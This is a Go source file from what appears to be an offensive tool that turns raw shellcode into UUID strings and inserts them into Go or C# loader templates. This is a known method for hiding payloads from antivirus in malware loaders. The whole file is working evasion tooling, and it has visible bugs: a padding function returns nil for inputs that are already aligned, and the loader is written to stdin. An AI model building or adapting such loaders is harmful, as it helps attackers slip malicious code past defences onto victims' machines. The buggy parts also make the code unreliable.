package genshellcode

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"

	"github.com/google/uuid"
)

func Padding(shellcode []byte) []byte {

	if shellcode != nil && len(shellcode)%16 != 0 {
		pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(shellcode)%16)
		shellcode = append(shellcode, pad...)
		return shellcode
	}

	return nil
}

func Shellcode2Uuids(shellcode []byte) ([]string, error) {

	//UUID: 8-4-4-4-12

	var uuids []string

	shellcode = Padding(shellcode)

	for i := 0; i < len(shellcode); i += 16 {
		var uuidBytes []byte

		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, binary.BigEndian.Uint32(shellcode[i:i+4]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+4:i+6]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+6:i+8]))
		uuidBytes = append(uuidBytes, buf...)

		// Add remaining
		uuidBytes = append(uuidBytes, shellcode[i+8:i+16]...)

		u, err := uuid.FromBytes(uuidBytes)
		if err != nil {
			return nil, fmt.Errorf("there was an error converting bytes into a UUID:\n%s", err)
		}

		uuids = append(uuids, u.String())
	}
	return uuids, nil
}

func WriteFile(filename string, uuids []string) error {

	file, err := os.OpenFile(filename, os.O_WRONLY|os.O_CREATE, 0666)
	if err != nil {
		log.Println("[-]文件打开失败", err)
		return err
	}
	defer file.Close()

	write := bufio.NewWriter(file)
	for _, i := range uuids {
		write.WriteString("\"" + i + "\"" + ",")
	}
	//Flush将缓存的文件真正写入到文件中
	write.Flush()
	return nil
}

func WriteLoader(filename string, loaderModel string, uuids []string) error {

	var ucode string
	flagStr := "~UUIDSHELLCODE~"

	var loaderMap = map[string]string{
		"go":     "loader-model/go_uuid_loader.go",
		"csharp": "loader-model/csharp_uuid_loader.cs",
		"cs":     "loader-model/csharp_uuid_loader.cs",
	}

	if uuids == nil {
		log.Fatal("[-]写入文件失败，uuid源为空")
	}

	for _, u := range uuids {
		ucode += fmt.Sprintf("\"%s\",", u)
	}

	data, err := ioutil.ReadFile(loaderMap[loaderModel])
	if err != nil {
		log.Println("[-]文件打开失败", err)
		return err
	}

	//输出到文件

	loader := strings.ReplaceAll(string(data), flagStr, ucode)

	if loader == "" {
		log.Fatal("[-]写入文件失败，uuid源为空")
	}

	if filename == "" {
		fmt.Fprintf(os.Stdin, "%s", loader)
		return nil
	}

	fd, err := os.OpenFile(filename, os.O_WRONLY|os.O_CREATE, 0666)

	if err != nil {
		log.Fatal("[-]打开loader文件错误", err)
		return err
	}
	defer fd.Close()

	fd.WriteString(loader)
	return nil
}
